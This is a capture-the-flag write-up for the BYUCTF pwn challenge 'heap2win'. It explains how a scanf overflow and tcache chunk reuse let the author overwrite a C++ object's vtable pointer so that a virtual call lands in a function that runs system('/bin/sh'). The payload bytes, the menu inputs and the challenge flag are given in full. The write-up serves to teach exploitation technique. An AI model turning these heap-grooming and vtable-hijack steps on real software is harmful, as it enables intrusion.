@@ -1,0 +1,86 @@
+---
+title: "BYUCTF: heap2win"
+description: "A C++ button app with a 16-byte %s overflow and a never-reachable WinnerButton::push that calls system(\"/bin/sh\"). tcache reuse drops a Custom button right before a live Hype button, turning a forward-only overflow into a vtable-pointer overwrite. No leak, all constants."
+date: 2026-05-31T11:21:45.738Z
+tags: ["ctf", "pwn", "heap", "c++", "vtable-hijack", "tcache", "byuctf"]
+draft: false
+---
+
+**Platform:** BYUCTF
+**Challenge:** heap2win
+**Category:** Pwn
+**Difficulty:** Medium
+
+## Flag
+
+`byuctf{y34h,..._you're_a_pro}`
+
+## Target
+
+`<remote-host>:1364`. `heap2win` + `main.cpp` (source given).
+
+- ELF 64-bit, **non-PIE** (EXEC), **Full RELRO**, **no canary**. C++ with virtual functions.
+- A C++ "button" app: make `Hype`/`Custom`/`Winner` buttons, then "push" one (a virtual call).
+
+## Bugs (from source)
+
+```cpp
+class WinnerButton : public Button {           // never reachable by menu (option 3 refuses)
+    void push() { cout<<"WINNER..."; system("/bin/sh"); }
+};
+class CustomButton : public Button {
+    char name[0x10];
+    CustomButton(){ scanf("%s", name); }       // (1) HEAP OVERFLOW: %s into 16-byte buf
+};
+// pushButton: only checks choice >= count+1  -> (2) negative/zero index allowed
+button_list[choice-1]->push();                  // virtual call: fn = *(vptr+0x10)
+```
+
+The win primitive is `WinnerButton::push` → `system("/bin/sh")`. Goal: make a button's **vptr** point at the WinnerButton vtable so its `push()` lands in `system`.
+
+## Vtable math
+
+- `nm`: vtable for WinnerButton @ `0x403630` → object **vptr = 0x403640**.
+- The call site does `rdx = *vptr; rdx += 0x10; call *rdx` → `*(0x403640+0x10) = *(0x403650) = 0x401376 = WinnerButton::push`. ✓
+- So writing **`0x403640`** into a victim button's first 8 bytes wins. Non-PIE ⇒ this address is constant.
+
+## Heap groom: the trick
+
+`HypeButton` (8 B), `CustomButton` (0x18 B) and the small `vector<Button*>` arrays are **all 0x20 chunks**. Each `push_back` that grows the vector frees the old array into tcache-0x20, and the next `new Button` reuses it (LIFO). gdb dump confirmed allocation order ≠ address order. Exploit the reuse so a **Custom button lands immediately *before* a live Hype button**, then overflow forward into that Hype's vptr:
+
+1. Make **Hype** (H0).
+2. Make **Hype** (H1), allocated fresh after H0.
+3. Make **Custom** (C). `new` reuses the freed array chunk that sits **right before H1**, i.e. `C` is adjacent and lower than `H1`.
+4. `C`'s `scanf("%s")` overflows out of `name` into `H1`'s vptr.
+
+Chunk layout (per gdb): `C@P`, `name@P+8`, next chunk header at `P+0x10/0x18`, `H1` object (vptr) at `P+0x20`. Distance `name → H1.vptr = 0x18 = 24`.
+
+## Payload
+
+Overwrite only the low 3 bytes; `scanf` appends the NUL (byte 3), and `H1`'s original vptr (`0x00403668`) already has zero high bytes:
+
+```python
+payload = b"A"*24 + b"\x40\x36\x40"     # 24 pad + 0x403640 (LE, low 3 bytes)
+# 0x40='@', 0x36='6' -> no whitespace, scanf reads all 27 bytes then NUL-terminates
+```
+
+Drive sequence (menus): make Hype, make Hype, make Custom w/ payload, **push button #2** (= H1):
+
+```python
+snd(b"1\n1\n"); snd(b"1\n1\n")
+snd(b"1\n2\n" + payload + b"\n")
+snd(b"2\n2\n")                # H1->push() now == WinnerButton::push -> /bin/sh
+snd(b"cat flag.txt\n")
+```
+
+`>> WINNER WINNER WINNER` → shell → `byuctf{y34h,..._you're_a_pro}`.
+
+## Takeaways
+
+- **C++ vtable hijack:** overwriting an object's vptr redirects every virtual call. With a `win` method in another class, point the victim vptr at that class's vtable and trigger the matching slot. Verify the slot offset from the call site (`*(vptr+0x10)` here).
+- **tcache reuse drives adjacency.** When victim objects and container backing-arrays share a size class, freed arrays let a later allocation slot in *before* an earlier object, turning a forward-only `%s` overflow into a victim-vptr overwrite. Confirm layout in gdb instead of guessing.
+- **Partial overwrite avoids null-byte problems:** write only the low bytes that differ; let `scanf`'s NUL terminator zero the next byte and rely on the original high bytes already being zero.
+- The `pushButton` negative-index bug (`choice<=0`) is a second, independent path (OOB `button_list[-k]`), but the overflow was the deterministic one.
+- Non-PIE + a fixed `win` vtable means **no leak needed**. The whole exploit is constants + heap shaping.
+
+*0xAdham*
